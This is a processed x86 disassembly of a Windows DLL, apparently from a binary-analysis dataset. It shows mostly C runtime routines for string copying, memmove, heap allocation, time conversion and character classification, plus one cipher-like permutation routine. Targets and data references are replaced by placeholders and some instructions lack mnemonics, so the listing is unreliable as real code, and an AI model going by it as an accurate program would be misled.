push ebx
push [ ebp - 0x2c ]
call sub_10010170
add esp 0x30
push 0x7
pop ecx
mov edi ebx
lea esi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
sub_10008a1c
push ebp
mov ebp esp
movzx edx [ eax ]
push esi
movzx esi [ eax + 0x5 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x1 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x2 ]
lea edx [ esi + edx * 2 ]
movzx esi [ eax + 0x3 ]
movzx eax [ eax + 0x4 ]
add eax [ ebp + 0x8 ]
lea edx [ esi + edx * 2 ]
mov al [ eax + edx * 2 ]
xor dl dl
pop esi
cmp al 0x8
jb r-xdata
mov [ ecx ] dl
mov [ ecx ] 0x1
add al 0xf8
jmp r-xdata
mov [ ecx + 0x1 ] dl
mov [ ecx + 0x1 ] 0x1
add al 0xfc
jmp r-xdata
cmp al 0x4
jb r-xdata
mov [ ecx + 0x2 ] dl
mov [ ecx + 0x2 ] 0x1
add al 0xfe
jmp r-xdata
cmp al 0x2
jb r-xdata
mov [ ecx + 0x3 ] al
pop ebp
retn
sub_10008a7c
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi edx
push eax
lea edx [ ebp - 0x74 ]
mov [ ebp - 0x12c ] ecx
call sub_1000882f
push esi
lea edx [ ebp - 0xf4 ]
call sub_1000882f
lea eax [ ebp - 0x74 ]
push eax
push rw-data
push eax
push 0x40
pop edi
call sub_10008950
lea eax [ ebp - 0xf4 ]
push eax
push rw-data
push eax
push 0x38
pop edi
call sub_10008950
add esp 0x20
push 0x8
pop ebx
mov ecx ebx
lea esi [ ebp - 0x74 ]
lea edi [ ebp - 0x94 ]
[ edi ] [ esi ]
mov ecx ebx
lea esi [ ebp - 0x54 ]
lea edi [ ebp - 0xb4 ]
[ edi ] [ esi ]
mov [ ebp - 0x128 ] rw-data
mov eax [ ebp - 0x128 ]
mov edx [ eax ]
lea ecx [ ebp - 0xf4 ]
call sub_1000898e
lea eax [ ebp - 0x124 ]
push eax
push rw-data
lea eax [ ebp - 0xf4 ]
push eax
push 0x30
pop edi
call sub_10008950
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0xb4 ]
push rw-data
push eax
call sub_10008950
lea eax [ ebp - 0x34 ]
push eax
push edi
push eax
lea eax [ ebp - 0x124 ]
call sub_100088f2
lea ecx [ ebp - 0x34 ]
push rw-data
mov eax ecx
call sub_10008a1c
push rw-data
lea ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x2e ]
call sub_10008a1c
push rw-data
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
call sub_10008a1c
push rw-data
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x22 ]
call sub_10008a1c
push rw-data
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x1c ]
call sub_10008a1c
push rw-data
lea ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x16 ]
call sub_10008a1c
push rw-data
lea ecx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_10008a1c
add esp 0x40
push rw-data
lea ecx [ ebp - 0x18 ]
lea eax [ ebp - 0xa ]
call sub_10008a1c
lea eax [ ebp - 0x34 ]
push eax
push rw-data
push eax
push 0x20
pop edi
call sub_10008950
lea eax [ ebp - 0x34 ]
push eax
push edi
push eax
lea eax [ ebp - 0x94 ]
call sub_100088f2
add [ ebp - 0x128 ] 0x4
mov ecx ebx
lea esi [ ebp - 0xb4 ]
lea edi [ ebp - 0x94 ]
[ edi ] [ esi ]
mov ecx ebx
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0xb4 ]
add esp 0x1c
cmp [ ebp - 0x128 ] rw-data
[ edi ] [ esi ]
jl r-xdata
lea eax [ ebp - 0x74 ]
push eax
push rw-data
mov ecx ebx
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x74 ]
[ edi ] [ esi ]
push eax
mov ecx ebx
lea esi [ ebp - 0x94 ]
lea edi [ ebp - 0x54 ]
[ edi ] [ esi ]
push 0x40
pop edi
call sub_10008950
push [ ebp - 0x12c ]
lea eax [ ebp - 0x74 ]
call sub_100088b2
mov ecx [ ebp - 0x4 ]
add esp 0x10
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
sub_10008ca9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100098a4
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10009ea4
int3
sub_10008cf6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_100098a4
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10009ea4
int3
sub_10008d43
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10009900
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10009140
pop ecx
sub_10008d73
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_1000aa1a
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000a821
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_10008e10
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10008ef0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_10009052
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_1000c015
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000a821
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000a821
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_1000914b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_1000cbe0
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_1000919c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10009991
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1000cd91
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10009932
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_10009ea4
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_1000981c
push sub_1001684f
mov [ rw-data ] esi
call sub_1000cd6b
pop ecx
sub_1000921c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
leave
retn
push esi
call sub_1000cdc0
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_1000928a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_1000cf02
call sub_1000921c
add esp 0x10
pop esi
pop ebp
retn
sub_100092b0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10009334 ]
jmp [ ecx * 4 + jump_table_100093b4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009420 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_100095bc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_100094c0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100095bc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10009420 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100095bc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009420 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009420 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10009420 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100095bc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100095bc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100095bc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10009611
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1000bc4d
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1000e9bd
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1000e23c
mov [ esi + 0x4 ] eax
sub_10009698
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1000ea36
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100096e9
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10009698
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_10009717
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_1000ea36
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1000976d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10009717
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_1000979d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_1000ea36
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100097ee
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000979d
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_10009846
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_1000cdc0
lea esi [ eax + 0x1 ]
push esi
call sub_10009991
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_1000eaee
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_100098a4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_10009846
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100098cb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_10009886
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_10009846
jmp r-xdata
sub_1000990b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10009886
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10009140
pop ecx
sub_10009932
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_100098cb
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10009957
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_1000b7fe
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000b7bc
pop ecx
mov [ esi ] eax
pop esi
sub_10009991
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_1000cd91
pop ecx
call sub_1000b7fe
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1000f01a
push 0x1e
call sub_1000ee6b
push 0xff
call sub_1000ebaa
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_1000b7fe
mov [ eax ] esi
push ebx
call sub_1000cd91
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_1000b7fe
mov [ eax ] esi
sub_10009a25
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
jmp r-xdata
